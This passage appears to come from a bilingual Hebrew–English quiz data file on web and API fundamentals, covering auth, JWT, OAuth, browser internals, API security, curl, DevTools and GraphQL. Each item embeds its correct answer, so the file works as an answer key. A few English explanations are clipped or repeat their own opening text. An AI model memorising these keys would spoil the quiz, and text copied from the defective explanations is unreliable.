        "\u200Fאין הבדל — מילים נרדפות"
      ],
      explanation: "‏אנלוגיה: Authentication = תעודת זהות בכניסה (מי אתה?).\n\nעיקרי:\n- Authorization = צמיד VIP (מה מותר לך?)\n- ב־HTTP: 401 = בעיית Authentication, 403 = בעיית Authorization",
      explanationEn: "Analogy: Authentication = ID at the entrance (who are you?).\n\nMain Points:\n- Authorization = VIP bracelet (what are you allowed?)\n- In HTTP: 401 = Authentication problem, 403 = Authorization problem",
      qEn: "What is the difference between Authentication and Authorization?",
      correctEn: "Authentication = 'Who are you?' (identification)\nAuthorization = 'What are you allowed?' (permissions)",
      choicesEn: [
        "Authentication = 'Who are you?' (identification)\nAuthorization = 'What are you allowed?' (permissions)",
        "Both deal with identification",
        "Authentication = permissions\nAuthorization = identification",
        "No difference — they are synonyms"
      ]
    },
    {
      q: "\u200FJWT מורכב משלושה חלקים. מה הם?",
      correct: "\u200FHeader (אלגוריתם) + Payload (מידע) + Signature (חתימה)",
      choices: [
        "\u200FHeader (אלגוריתם) + Payload (מידע) + Signature (חתימה)",
        "\u200FUsername + Password + Token",
        "\u200FPublic Key + Private Key + Certificate",
        "\u200FURL + Method + Body"
      ],
      explanation: "‏Header מכיל את אלגוריתם החתימה.\n\nעיקרי:\n- Payload מכיל נתונים (user_id, role, exp)\n- Signature מוודאת שלא שינו את התוכן\n- שלושתם מקודדים ב־Base64 ומופרדים בנקודות",
      explanationEn: "Header contains the signing algorithm.\n\nMain Points:\n- Payload contains data (user_id, role, exp)\n- Signature ensures content wasn't tampered with\n- All three are Base64-encoded and separated by dots",
      qEn: "JWT consists of three parts. What are they?",
      correctEn: "Header (algorithm) + Payload (data) + Signature (signature)",
      choicesEn: [
        "Header (algorithm) + Payload (data) + Signature (signature)",
        "Username + Password + Token",
        "Public Key + Private Key + Certificate",
        "URL + Method + Body"
      ]
    },
    {
      q: "\u200Fלמה OAuth 2.0 לא שולח Access Token ישירות לדפדפן?",
      correct: "\u200Fכי הדפדפן פחות בטוח (URL נשמר בהיסטוריה)\nלכן שולחים Authorization Code, והטוקן מועבר server-to-server",
      choices: [
        "\u200Fכי הדפדפן פחות בטוח (URL נשמר בהיסטוריה)\nלכן שולחים Authorization Code, והטוקן מועבר server-to-server",
        "\u200Fכי הדפדפן לא תומך בטוקנים",
        "\u200Fכי הטוקן גדול מדי",
        "\u200Fכי OAuth לא עובד בדפדפן"
      ],
      explanation: "‏ה־Authorization Code עובר דרך ה-redirect URL בדפדפן (פחות בטוח — יכול להישמר ב-logs, היסטוריה).\n\nעיקרי:\n- הקוד הזה חד-פעמי\n- החלפה לטוקן מתבצעת server-to-server — ערוץ מאובטח",
      explanationEn: "The Authorization Code passes through the browser's redirect URL (less secure — can be saved in logs, history).\n\nMain Points:\n- This code is one-time use\n- Exchange for token happens server-to-server — a secure channel",
      qEn: "Why doesn't OAuth 2.0 send the Access Token directly to the browser?",
      correctEn: "Because the browser is less secure (URL saved in history)\nSo it sends Authorization Code, and the token is transferred server-to-server",
      choicesEn: [
        "Because the browser is less secure (URL saved in history)\nSo it sends Authorization Code, and the token is transferred server-to-server",
        "Because the browser doesn't support tokens",
        "Because the token is too large",
        "Because OAuth doesn't work in browsers"
      ]
    },
    {
      q: "\u200Fמתי עדיף Sessions על JWT?",
      correct: "\u200Fכשצריך אפשרות לנתק משתמש מיידית\nב־Sessions פשוט מוחקים מהשרת, ב־JWT אי אפשר לבטל טוקן",
      choices: [
        "\u200Fכשצריך אפשרות לנתק משתמש מיידית\nב־Sessions פשוט מוחקים מהשרת, ב־JWT אי אפשר לבטל טוקן",
        "\u200Fתמיד עדיף JWT",
        "\u200Fרק כשאין מסד נתונים",
        "\u200Fכשרוצים מערכת מבוזרת"
      ],
      explanation: "‏Session ניתן לביטול מיידי (מוחקים מהשרת/Redis).\n\nעיקרי:\n- JWT תקף עד שפג תוקפו — גם אם נגנב\n- לכן: אתר רגיל → Sessions\n- API מבוזר → JWT קצר + Refresh Token",
      explanationEn: "Sessions can be revoked immediately (delete from server/Redis).\n\nMain Points:\n- JWT is valid until expiry — even if stolen\n- So: regular website → Sessions\n- Distributed API → short JWT + Refresh Token",
      qEn: "When are Sessions better than JWT?",
      correctEn: "When you need the ability to disconnect a user immediately\nWith Sessions you just delete from server, JWT can't be revoked",
      choicesEn: [
        "When you need the ability to disconnect a user immediately\nWith Sessions you just delete from server, JWT can't be revoked",
        "JWT is always better",
        "Only when there's no database",
        "When building a distributed system"
      ]
    },
    {
      q: "\u200FBase64 שמשמש ב־Basic Auth הוא הצפנה?",
      correct: "\u200Fלא — Base64 הוא קידוד, לא הצפנה\nכל אחד יכול לפענח. לכן חובה HTTPS",
      choices: [
        "\u200Fלא — Base64 הוא קידוד, לא הצפנה\nכל אחד יכול לפענח. לכן חובה HTTPS",
        "\u200Fכן — Base64 מצפין את הסיסמה",
        "\u200FBase64 הוא hash חד-כיווני",
        "\u200FBase64 משתמש במפתח סודי"
      ],
      explanation: "‏Base64 רק ממיר בינארי לטקסט ASCII — אין שום אבטחה.\n\nעיקרי:\n- כל אחד יכול לפענח: echo 'dXNlcjpwYXNz' | base64 -d = 'user:pass'\n- לכן Basic Auth חייב לעבוד מעל HTTPS",
      explanationEn: "Base64 just converts binary to ASCII text — there's no security.\n\nMain Points:\n- Anyone can decode: echo 'dXNlcjpwYXNz' | base64 -d = 'user:pass'\n- That's why Basic Auth must work over HTTPS",
      qEn: "Is the Base64 used in Basic Auth encryption?",
      correctEn: "No — Base64 is encoding, not encryption\nAnyone can decode it. HTTPS is mandatory",
      choicesEn: [
        "No — Base64 is encoding, not encryption\nAnyone can decode it. HTTPS is mandatory",
        "Yes — Base64 encrypts the password",
        "Base64 is a one-way hash",
        "Base64 uses a secret key"
      ]
    }
  ],

  505: [
    {
      q: "\u200Fמה סדר שלבי הרינדור בדפדפן?",
      correct: "\u200FHTML→DOM, CSS→CSSOM, שילוב→Render Tree\nLayout→Paint→Composite",
      choices: [
        "\u200FHTML→DOM, CSS→CSSOM, שילוב→Render Tree\nLayout→Paint→Composite",
        "\u200FCSS→HTML→JavaScript→Display",
        "\u200FDownload→Parse→Execute→Show",
        "\u200FServer→Client→Browser→Screen"
      ],
      explanation: "‏הדפדפן בונה DOM מ־HTML ו־CSSOM מ־CSS.\n\nעיקרי:\n- משלב אותם ל־Render Tree (רק אלמנטים נראים)\n- מחשב Layout (מיקומים וגדלים), צובע (Paint) ומרכיב שכבות (Composite)",
      explanationEn: "The browser builds DOM from HTML and CSSOM from CSS.\n\nMain Points:\n- Combines them into Render Tree (visible elements only)\n- Calculates Layout (positions and sizes), paints (Paint), and composites layers (Composite)",
      qEn: "What is the order of rendering steps in the browser?",
      correctEn: "HTML→DOM, CSS→CSSOM, combine→Render Tree\nLayout→Paint→Composite",
      choicesEn: [
        "HTML→DOM, CSS→CSSOM, combine→Render Tree\nLayout→Paint→Composite",
        "CSS→HTML→JavaScript→Display",
        "Download→Parse→Execute→Show",
        "Server→Client→Browser→Screen"
      ]
    },
    {
      q: "\u200Fמה עושה ה־Event Loop ב־JavaScript?",
      correct: "\u200Fמעביר callbacks מה-queue ל־Call Stack\nכשה-stack ריק — כך JS מטפל בפעולות א-סינכרוניות",
      choices: [
        "\u200Fמעביר callbacks מה-queue ל־Call Stack\nכשה-stack ריק — כך JS מטפל בפעולות א-סינכרוניות",
        "\u200Fמריץ קוד במקביל על כמה threads",
        "\u200Fמרענן את הדף כל שנייה",
        "\u200Fמנהל את זיכרון הדפדפן"
      ],
      explanation: "‏JavaScript רץ על thread יחיד.\n\nעיקרי:\n- פעולות ארוכות (fetch, setTimeout) מועברות ל־Web APIs\n- כשמסתיימות, ה-callback נכנס ל-queue\n- ה־Event Loop בודק: Call Stack ריק",
      explanationEn: "JavaScript runs on a single thread.\n\nMain Points:\n- Long operations (fetch, setTimeout) are passed to Web APIs\n- When done, the callback enters the queue\n- Event Loop checks: Call Stack empty",
      qEn: "What does the Event Loop do in JavaScript?",
      correctEn: "Moves callbacks from the queue to the Call Stack\nwhen the stack is empty — this is how JS handles async operations",
      choicesEn: [
        "Moves callbacks from the queue to the Call Stack\nwhen the stack is empty — this is how JS handles async operations",
        "Runs code in parallel on multiple threads",
        "Refreshes the page every second",
        "Manages browser memory"
      ]
    },
    {
      q: "\u200Fמה מגדיר Same-Origin ב־Same-Origin Policy?",
      correct: "\u200FOrigin = scheme + host + port\nשינוי באחד מהם = origin שונה",
      choices: [
        "\u200FOrigin = scheme + host + port\nשינוי באחד מהם = origin שונה",
        "\u200FOrigin = שם הדומיין בלבד",
        "\u200FOrigin = כתובת IP",
        "\u200FOrigin = הנתיב (path) ב־URL"
      ],
      explanation: "‏https://example.com:443 הוא ה-origin.\n\nעיקרי:\n- שינוי ב-scheme (http://), host (api.example.com), או port (:8080) = origin שונה\n- הדפדפן חוסם גישה בין origins שונים",
      explanationEn: "https://example.com:443 is the origin.\n\nMain Points:\n- Changing the scheme (http://), host (api.example.com), or port (:8080) = different origin\n- The browser blocks access between different origins",
      qEn: "What defines Same-Origin in Same-Origin Policy?",
      correctEn: "Origin = scheme + host + port\nChanging any one of them = different origin",
      choicesEn: [
        "Origin = scheme + host + port\nChanging any one of them = different origin",
        "Origin = domain name only",
        "Origin = IP address",
        "Origin = the path in the URL"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין localStorage ל-sessionStorage?",
      correct: "\u200FlocalStorage נשמר לצמיתות (גם אחרי סגירת הדפדפן)\nsessionStorage נמחק כשסוגרים את הטאב",
      choices: [
        "\u200FlocalStorage נשמר לצמיתות (גם אחרי סגירת הדפדפן)\nsessionStorage נמחק כשסוגרים את הטאב",
        "\u200FlocalStorage נשלח לשרת\nsessionStorage לא",
        "\u200FlocalStorage קטן יותר מ-sessionStorage",
        "\u200Fאין הבדל — שניהם זהים"
      ],
      explanation: "‏שניהם מאחסנים עד ~5-10MB, לא נשלחים לשרת.\n\nעיקרי:\n- ההבדל: localStorage נשאר לנצח (עד שמוחקים)\n- sessionStorage ספציפי לטאב ונמחק בסגירתו\n- שניהם חשופים ל־XSS",
      explanationEn: "Both store up to ~5-10MB, not sent to server.\n\nMain Points:\n- Difference: localStorage persists forever (until deleted)\n- sessionStorage is tab-specific and deleted when closed\n- Both are vulnerable to XSS",
      qEn: "What is the difference between localStorage and sessionStorage?",
      correctEn: "localStorage persists permanently (even after closing browser)\nsessionStorage is deleted when the tab closes",
      choicesEn: [
        "localStorage persists permanently (even after closing browser)\nsessionStorage is deleted when the tab closes",
        "localStorage is sent to server\nsessionStorage is not",
        "localStorage is smaller than sessionStorage",
        "No difference — both are identical"
      ]
    },
    {
      q: "\u200Fאיך מעתיקים בקשת API מהדפדפן כפקודת curl?",
      correct: "\u200FDevTools → Network → Right-click על הבקשה → Copy → Copy as cURL",
      choices: [
        "\u200FDevTools → Network → Right-click על הבקשה → Copy → Copy as cURL",
        "\u200FDevTools → Console → copy(request)",
        "\u200FDevTools → Elements → Export",
        "\u200Fלא ניתן לעשות זאת מהדפדפן"
      ],
      explanation: "‏זה מייצר פקודת curl מלאה כולל headers, cookies, ו-body — מאוד שימושי לדיבוג.\n\nעיקרי:\n- אפשר להדביק את הפקודה בטרמינל ולהריץ מיד",
      explanationEn: "This generates a complete curl command including headers, cookies, and body — very useful for debugging.\n\nMain Points:\n- You can paste the command in a terminal and run it immediately",
      qEn: "How do you copy an API request from the browser as a curl command?",
      correctEn: "DevTools → Network → Right-click the request → Copy → Copy as cURL",
      choicesEn: [
        "DevTools → Network → Right-click the request → Copy → Copy as cURL",
        "DevTools → Console → copy(request)",
        "DevTools → Elements → Export",
        "This cannot be done from the browser"
      ]
    }
  ],

  506: [
    {
      q: "\u200Fמהי התקפת BOLA/IDOR?",
      correct: "\u200Fתוקף משנה ID ב־URL ומקבל גישה למידע של משתמש אחר\nהחולשה מספר 1 ב־OWASP API Security",
      choices: [
        "\u200Fתוקף משנה ID ב־URL ומקבל גישה למידע של משתמש אחר\nהחולשה מספר 1 ב־OWASP API Security",
        "\u200Fתוקף מציף את השרת בבקשות",
        "\u200Fתוקף מזריק SQL לבסיס הנתונים",
        "\u200Fתוקף גונב cookies מהדפדפן"
      ],
      explanation: "‏דוגמה: GET /api/orders/123 (ההזמנה שלך) → שנה ל-/api/orders/124 (הזמנה של מישהו אחר).\n\nעיקרי:\n- הבעיה: השרת בודק authentication (מי אתה) אבל לא authorization (זו ההזמנה שלך?)",
      explanationEn: "Example: GET /api/orders/123 (your order) → change to /api/orders/124 (someone else's order).\n\nMain Points:\n- The problem: server checks authentication (who are you) but not authorization (is this your order?)",
      qEn: "What is a BOLA/IDOR attack?",
      correctEn: "Attacker changes ID in URL and gains access to another user's data\nThe #1 vulnerability in OWASP API Security",
      choicesEn: [
        "Attacker changes ID in URL and gains access to another user's data\nThe #1 vulnerability in OWASP API Security",
        "Attacker floods the server with requests",
        "Attacker injects SQL into the database",
        "Attacker steals cookies from the browser"
      ]
    },
    {
      q: "\u200Fמה מחזיר שרת כשלקוח חורג מ־Rate Limit?",
      correct: "\u200Fקוד 429 Too Many Requests\nעם כותרת Retry-After שאומרת מתי לנסות שוב",
      choices: [
        "\u200Fקוד 429 Too Many Requests\nעם כותרת Retry-After שאומרת מתי לנסות שוב",
        "\u200Fקוד 403 Forbidden",
        "\u200Fקוד 500 Internal Server Error",
        "\u200Fקוד 503 Service Unavailable"
      ],
      explanation: "‏השרת מחזיר 429 + כותרות\n\nעיקרי:\n- X-RateLimit-Limit (מכסה)\n- X-RateLimit-Remaining (נותר)\n- X-RateLimit-Reset (מתאפס)",
      explanationEn: "The server returns 429 + headers: X-RateLimit-Limit (quota), X-RateLimit-Remaining (left), X-RateLimit-Reset (resets), Retry-After (when to retry)..\n\nMain Points:\n- The server returns 429 + headers: X-RateLimit-Limit (quota),",
      qEn: "What does a server return when a client exceeds the Rate Limit?",
      correctEn: "Status 429 Too Many Requests\nwith Retry-After header telling when to try again",
      choicesEn: [
        "Status 429 Too Many Requests\nwith Retry-After header telling when to try again",
        "Status 403 Forbidden",
        "Status 500 Internal Server Error",
        "Status 503 Service Unavailable"
      ]
    },
    {
      q: "\u200Fלמה ולידציה ב-frontend לא מספיקה לאבטחה?",
      correct: "\u200Fתוקף יכול לעקוף את ה-frontend ולשלוח בקשות ישירות\nעם curl או Postman — ולידציה חייבת להיות בצד שרת",
      choices: [
        "\u200Fתוקף יכול לעקוף את ה-frontend ולשלוח בקשות ישירות\nעם curl או Postman — ולידציה חייבת להיות בצד שרת",
        "\u200Fולידציה ב-frontend מספיקה לחלוטין",
        "\u200Fכי ה-frontend איטי",
        "\u200Fכי JavaScript לא יכול לבדוק נתונים"
      ],
      explanation: "‏ולידציה ב-frontend משפרת UX (חוויית משתמש).\n\nעיקרי:\n- אבל לאבטחה — כל בדיקה חייבת להתבצע גם בצד שרת\n- Parameterized queries נגד SQL Injection, sanitization נגד XSS",
      explanationEn: "Frontend validation improves UX (user experience).\n\nMain Points:\n- But for security — every check must also be done server-side\n- Parameterized queries against SQL Injection, sanitization against XSS",
      qEn: "Why is frontend validation not enough for security?",
      correctEn: "An attacker can bypass the frontend and send requests directly\nwith curl or Postman — validation must be server-side",
      choicesEn: [
        "An attacker can bypass the frontend and send requests directly\nwith curl or Postman — validation must be server-side",
        "Frontend validation is completely sufficient",
        "Because the frontend is slow",
        "Because JavaScript can't validate data"
      ]
    },
    {
      q: "\u200Fלמה HTTPS חיוני ו־HTTP מסוכן?",
      correct: "\u200FHTTP שולח הכל כטקסט גלוי — כל מי שמאזין רואה סיסמאות ו-cookies\nHTTPS מצפין את כל התקשורת",
      choices: [
        "\u200FHTTP שולח הכל כטקסט גלוי — כל מי שמאזין רואה סיסמאות ו-cookies\nHTTPS מצפין את כל התקשורת",
        "\u200FHTTP איטי יותר מ־HTTPS",
        "\u200FHTTP לא תומך ב-cookies",
        "\u200Fאין הבדל אבטחתי ביניהם"
      ],
      explanation: "‏ב־WiFi ציבורי, כל מי שנמצא ברשת יכול לקרוא תעבורת HTTP — סיסמאות, session tokens, תוכן.\n\nעיקרי:\n- HTTPS (HTTP+TLS) מצפין הכל\n- Let's Encrypt מספק תעודות SSL חינם",
      explanationEn: "On public WiFi, anyone on the network can read HTTP traffic — passwords, session tokens, content.\n\nMain Points:\n- HTTPS (HTTP+TLS) encrypts everything\n- Let's Encrypt provides free SSL certificates",
      qEn: "Why is HTTPS essential and HTTP dangerous?",
      correctEn: "HTTP sends everything as plaintext — anyone listening sees passwords and cookies\nHTTPS encrypts all communication",
      choicesEn: [
        "HTTP sends everything as plaintext — anyone listening sees passwords and cookies\nHTTPS encrypts all communication",
        "HTTP is slower than HTTPS",
        "HTTP doesn't support cookies",
        "No security difference between them"
      ]
    },
    {
      q: "\u200Fלמה אסור להגדיר Access-Control-Allow-Origin: * עם credentials?",
      correct: "\u200Fכי זה מאפשר לכל אתר בעולם לגשת ל־API עם cookies\nצריך להגדיר origins ספציפיים",
      choices: [
        "\u200Fכי זה מאפשר לכל אתר בעולם לגשת ל־API עם cookies\nצריך להגדיר origins ספציפיים",
        "\u200Fכי * לא עובד בכלל",
        "\u200Fכי זה מאט את הביצועים",
        "\u200Fמותר לחלוטין — זה בטוח"
      ],
      explanation: "‏* + Allow-Credentials: true = כל אתר יכול לגשת ל־API בשם המשתמש (cookies נשלחים).\n\nעיקרי:\n- דפדפנים חוסמים שילוב זה\n- הפתרון: רשימת origins מותרים ספציפית",
      explanationEn: "* + Allow-Credentials: true = any website can access the API on behalf of the user (cookies are sent).\n\nMain Points:\n- Browsers block this combination\n- Solution: a specific list of allowed origins",
      qEn: "Why is it forbidden to set Access-Control-Allow-Origin: * with credentials?",
      correctEn: "Because it allows any website in the world to access the API with cookies\nYou must set specific origins",
      choicesEn: [
        "Because it allows any website in the world to access the API with cookies\nYou must set specific origins",
        "Because * doesn't work at all",
        "Because it slows performance",
        "It's perfectly fine — it's secure"
      ]
    }
  ],

  507: [
    {
      q: "\u200Fמה היתרון של Postman על curl לעבודה עם APIs?",
      correct: "\u200Fממשק גרפי, היסטוריה, Collections, Environment Variables\nובדיקות אוטומטיות — נוח לעבודה שוטפת",
      choices: [
        "\u200Fממשק גרפי, היסטוריה, Collections, Environment Variables\nובדיקות אוטומטיות — נוח לעבודה שוטפת",
        "\u200FPostman מהיר יותר מ-curl",
        "\u200FPostman עובד בלי אינטרנט",
        "\u200Fcurl עדיף תמיד"
      ],
      explanation: "‏Postman מציע ממשק ויזואלי, שמירת בקשות ב־Collections, משתני סביבה {{token}} שמשתנים בין dev/prod, ובדיקות אוטומטיות.\n\nעיקרי:\n- curl מתאים יותר לסקריפטים ואוטומציה",
      explanationEn: "Postman offers a visual interface, saving requests in Collections, environment variables {{token}} that change between dev/prod, and automated tests.\n\nMain Points:\n- curl is better suited for scripts and automation",
      qEn: "What is the advantage of Postman over curl for working with APIs?",
      correctEn: "GUI, history, Collections, Environment Variables\nand automated tests — convenient for daily work",
      choicesEn: [
        "GUI, history, Collections, Environment Variables\nand automated tests — convenient for daily work",
        "Postman is faster than curl",
        "Postman works offline",
        "curl is always better"
      ]
    },
    {
      q: "\u200Fמה הדגל -v עושה ב-curl?",
      correct: "\u200Fverbose — מציג את כל התקשורת: headers, TLS, request ו-response מלאים",
      choices: [
        "\u200Fverbose — מציג את כל התקשורת: headers, TLS, request ו-response מלאים",
        "\u200Fמפעיל מצב וידאו",
        "\u200Fמגדיר גרסת HTTP",
        "\u200Fמוודא SSL"
      ],
      explanation: "‏curl -v https://api.example.com מציג את כל שלבי התקשורת: DNS, TCP handshake, TLS negotiation, request headers, response headers, ו-body.\n\nעיקרי:\n- שימושי מאוד לדיבוג",
      explanationEn: "curl -v https://api.example.com shows all communication steps: DNS, TCP handshake, TLS negotiation, request headers, response headers, and body.\n\nMain Points:\n- Very useful for debugging",
      qEn: "What does the -v flag do in curl?",
      correctEn: "verbose — shows all communication: headers, TLS, full request and response",
      choicesEn: [
        "verbose — shows all communication: headers, TLS, full request and response",
        "Enables video mode",
        "Sets HTTP version",
        "Verifies SSL"
      ]
    },
    {
      q: "\u200Fמה מסמל סמל מנעול ליד endpoint בתיעוד Swagger?",
      correct: "\u200Fשה-endpoint דורש אימות (authentication)\nצריך לשלוח token בכותרת Authorization",
      choices: [
        "\u200Fשה-endpoint דורש אימות (authentication)\nצריך לשלוח token בכותרת Authorization",
        "\u200Fשה-endpoint מוצפן",
        "\u200Fשה-endpoint לא פעיל",
        "\u200Fשה-endpoint למנהלים בלבד"
      ],
      explanation: "‏ב־Swagger UI, מנעול אומר שצריך אימות.\n\nעיקרי:\n- לחצו על 'Authorize' בראש הדף והזינו את הטוקן\n- מכאן כל הבקשות ישלחו אותו אוטומטית",
      explanationEn: "In Swagger UI, a lock means authentication is required.\n\nMain Points:\n- Click 'Authorize' at the top and enter your token\n- From then on, all requests will send it automatically",
      qEn: "What does a lock icon next to an endpoint in Swagger documentation mean?",
      correctEn: "The endpoint requires authentication\nYou need to send a token in the Authorization header",
      choicesEn: [
        "The endpoint requires authentication\nYou need to send a token in the Authorization header",
        "The endpoint is encrypted",
        "The endpoint is inactive",
        "The endpoint is for admins only"
      ]
    },
    {
      q: "\u200Fמה מציג טאב Network ב־DevTools לכל בקשה?",
      correct: "\u200FHeaders (כותרות), Payload (body), Response (תגובה)\nTiming (זמנים: DNS, TCP, TTFB)",
      choices: [
        "\u200FHeaders (כותרות), Payload (body), Response (תגובה)\nTiming (זמנים: DNS, TCP, TTFB)",
        "\u200Fרק את קוד הסטטוס",
        "\u200Fרק את גוף התגובה",
        "\u200Fרק את כתובת ה־URL"
      ],
      explanation: "‏לחיצה על בקשה בטאב Network מציגה\n\nעיקרי:\n- request/response headers\n- body ששנשלח (Payload)\n- תגובת השרת (Preview/Response)",
      explanationEn: "Clicking a request in the Network tab shows: request/response headers, sent body (Payload), server response (Preview/Response), and detailed timing — DNS, TCP, TLS, TTFB, Download..\n\nMain Points:\n- Clicking a request in the Network tab shows: request/respons",
      qEn: "What does the Network tab in DevTools show for each request?",
      correctEn: "Headers, Payload (body), Response\nTiming (DNS, TCP, TTFB)",
      choicesEn: [
        "Headers, Payload (body), Response\nTiming (DNS, TCP, TTFB)",
        "Only the status code",
        "Only the response body",
        "Only the URL"
      ]
    },
    {
      q: "\u200Fאיך בודקים התנהגות אפליקציה ברשת איטית ב־DevTools?",
      correct: "\u200Fטאב Network → Throttling → בחירת 'Slow 3G'\nלבדיקת loading, timeouts, וטיפול בשגיאות",
      choices: [
        "\u200Fטאב Network → Throttling → בחירת 'Slow 3G'\nלבדיקת loading, timeouts, וטיפול בשגיאות",
        "\u200Fלא ניתן לדמות רשת איטית בדפדפן",
        "\u200Fצריך להתנתק מהאינטרנט",
        "\u200Fמשנים את הגדרות ה־WiFi"
      ],
      explanation: "‏Throttling ב־DevTools מדמה רשת איטית ללא שינוי החיבור האמיתי.\n\nעיקרי:\n- מאפשר לבדוק: האם יש מסך loading\n- האם יש טיפול ב-timeouts\n- האם הדף עדיין שמיש",
      explanationEn: "Throttling in DevTools simulates a slow network without changing the actual connection.\n\nMain Points:\n- Allows testing: Is there a loading screen\n- Is there timeout handling\n- Is the page still usable",
      qEn: "How do you test app behavior on a slow network in DevTools?",
      correctEn: "Network tab → Throttling → select 'Slow 3G'\nTo test loading, timeouts, and error handling",
      choicesEn: [
        "Network tab → Throttling → select 'Slow 3G'\nTo test loading, timeouts, and error handling",
        "Cannot simulate slow network in browser",
        "Need to disconnect from internet",
        "Change WiFi settings"
      ]
    }
  ],

  508: [
    {
      q: "\u200Fמה ההבדל בין Webhooks לבין Polling?",
      correct: "\u200FWebhook — השרת שולח POST כשקורה אירוע (Push, יעיל)\nPolling — הלקוח שואל שוב ושוב (Pull, בזבזני)",
      choices: [
        "\u200FWebhook — השרת שולח POST כשקורה אירוע (Push, יעיל)\nPolling — הלקוח שואל שוב ושוב (Pull, בזבזני)",
        "\u200FPolling יעיל יותר מ־Webhooks",
        "\u200FWebhooks דורשים WebSocket",
        "\u200Fאין הבדל — שניהם זהים"
      ],
      explanation: "‏Polling: GET /api/updates כל 5 שניות — רוב הבקשות חוזרות ריקות.\n\nעיקרי:\n- Webhook: השרת שולח POST ל־URL שלכם רק כשקורה משהו\n- דוגמאות: GitHub push, Stripe payment, Slack notification",
      explanationEn: "Polling: GET /api/updates every 5 seconds — most requests return empty.\n\nMain Points:\n- Webhook: server sends POST to your URL only when something happens\n- Examples: GitHub push, Stripe payment, Slack notification",
      qEn: "What is the difference between Webhooks and Polling?",
      correctEn: "Webhook — server sends POST when event occurs (Push, efficient)\nPolling — client asks repeatedly (Pull, wasteful)",
      choicesEn: [
        "Webhook — server sends POST when event occurs (Push, efficient)\nPolling — client asks repeatedly (Pull, wasteful)",
        "Polling is more efficient than Webhooks",
        "Webhooks require WebSocket",
        "No difference — both are identical"
      ]
    },
    {
      q: "\u200Fמה מיוחד ב־WebSocket לעומת HTTP רגיל?",
      correct: "\u200Fחיבור קבוע דו-כיווני — שני הצדדים יכולים לשלוח הודעות בכל רגע\nמתאים לצ'אט, נתונים חיים, משחקים",
      choices: [
        "\u200Fחיבור קבוע דו-כיווני — שני הצדדים יכולים לשלוח הודעות בכל רגע\nמתאים לצ'אט, נתונים חיים, משחקים",
        "\u200FWebSocket מהיר יותר מ־HTTP",
        "\u200FWebSocket מוצפן יותר",
        "\u200FWebSocket עובד בלי אינטרנט"
      ],
      explanation: "‏HTTP: בקשה → תגובה → סוף.\n\nעיקרי:\n- WebSocket: חיבור נפתח (HTTP Upgrade) ונשאר פתוח — שני הצדדים שולחים הודעות בכל רגע\n- wss:// = WebSocket מוצפן\n- שימושים: צ'אט, מניות חיות, משחקים",
      explanationEn: "HTTP: request → response → done.\n\nMain Points:\n- WebSocket: connection opens (HTTP Upgrade) and stays open — both sides send messages anytime\n- wss:// = encrypted WebSocket\n- Uses: chat, live stocks, games",
      qEn: "What is special about WebSocket compared to regular HTTP?",
      correctEn: "Persistent bidirectional connection — both sides can send messages anytime\nSuitable for chat, live data, games",
      choicesEn: [
        "Persistent bidirectional connection — both sides can send messages anytime\nSuitable for chat, live data, games",
        "WebSocket is faster than HTTP",
        "WebSocket is more encrypted",
        "WebSocket works without internet"
      ]
    },
    {
      q: "\u200Fאיזו בעיה של REST פותר GraphQL?",
      correct: "\u200FOver-fetching (מקבלים יותר מדי) ו־Under-fetching (צריך כמה בקשות)\nב־GraphQL הלקוח מגדיר בדיוק מה הוא רוצה",
      choices: [
        "\u200FOver-fetching (מקבלים יותר מדי) ו־Under-fetching (צריך כמה בקשות)\nב־GraphQL הלקוח מגדיר בדיוק מה הוא רוצה",
        "\u200FGraphQL מהיר יותר מ־REST",
        "\u200FGraphQL מאובטח יותר",
        "\u200FGraphQL לא צריך שרת"
      ],
      explanation: "‏ב־REST: GET /users/42 מחזיר 20 שדות כשצריכים 3 (over-fetching), או צריך 3 בקשות לדף אחד (under-fetching).\n\nעיקרי:\n- ב־GraphQL: בקשה אחת שמגדירה בדיוק אילו שדות להחזיר",
      explanationEn: "In REST: GET /users/42 returns 20 fields when you need 3 (over-fetching), or you need 3 requests for one page (under-fetching).\n\nMain Points:\n- In GraphQL: one request that defines exactly which fields to return",
      qEn: "What REST problem does GraphQL solve?",
      correctEn: "Over-fetching (getting too much) and Under-fetching (needing multiple requests)\nIn GraphQL the client defines exactly what it wants",
      choicesEn: [
        "Over-fetching (getting too much) and Under-fetching (needing multiple requests)\nIn GraphQL the client defines exactly what it wants",
        "GraphQL is faster than REST",
        "GraphQL is more secure",
        "GraphQL doesn't need a server"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Offset-based ל־Cursor-based pagination?",
      correct: "\u200FOffset: page=3&limit=20 (פשוט אבל לא יעיל בנתונים גדולים)\nCursor: after=xyz&limit=20 (יעיל, לא מדלג על רשומות)",
      choices: [
        "\u200FOffset: page=3&limit=20 (פשוט אבל לא יעיל בנתונים גדולים)\nCursor: after=xyz&limit=20 (יעיל, לא מדלג על רשומות)",
        "\u200Fשניהם זהים",
        "\u200FOffset ליעיל יותר",
        "\u200FCursor עובד רק עם SQL"
      ],
      explanation: "‏Offset-based: הולך ל-page 3 על ידי דילוג על 40 רשומות — איטי בטבלאות גדולות.\n\nעיקרי:\n- Cursor-based: ממשיך מהנקודה האחרונה — יעיל ולא מפספס רשומות שנוספו תוך כדי",
      explanationEn: "Offset-based: goes to page 3 by skipping 40 records — slow on large tables.\n\nMain Points:\n- Cursor-based: continues from the last point — efficient and doesn't miss records added in between",
      qEn: "What is the difference between Offset-based and Cursor-based pagination?",
      correctEn: "Offset: page=3&limit=20 (simple but inefficient for large data)\nCursor: after=xyz&limit=20 (efficient, doesn't skip records)",
      choicesEn: [
        "Offset: page=3&limit=20 (simple but inefficient for large data)\nCursor: after=xyz&limit=20 (efficient, doesn't skip records)",
        "Both are identical",
        "Offset is more efficient",
        "Cursor only works with SQL"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין REST לבין GraphQL מבחינת cache?",
      correct: "\u200FREST — cache קל כי כל endpoint הוא URL ייחודי\nGraphQL — cache מורכב כי כל הבקשות הולכות לendpoint אחד (/graphql)",
      choices: [
        "\u200FREST — cache קל כי כל endpoint הוא URL ייחודי\nGraphQL — cache מורכב כי כל הבקשות הולכות לendpoint אחד (/graphql)",
        "\u200FGraphQL עם cache טוב יותר",
        "\u200Fשניהם ללא cache",
        "\u200FREST לא תומך ב-cache"
      ],
      explanation: "‏ב־REST: GET /users/42 → URL ייחודי → cache פשוט (HTTP caching).\n\nעיקרי:\n- ב־GraphQL: POST /graphql עם query body שונה בכל פעם → צריך cache חכם ברמת client (Apollo, Relay)",
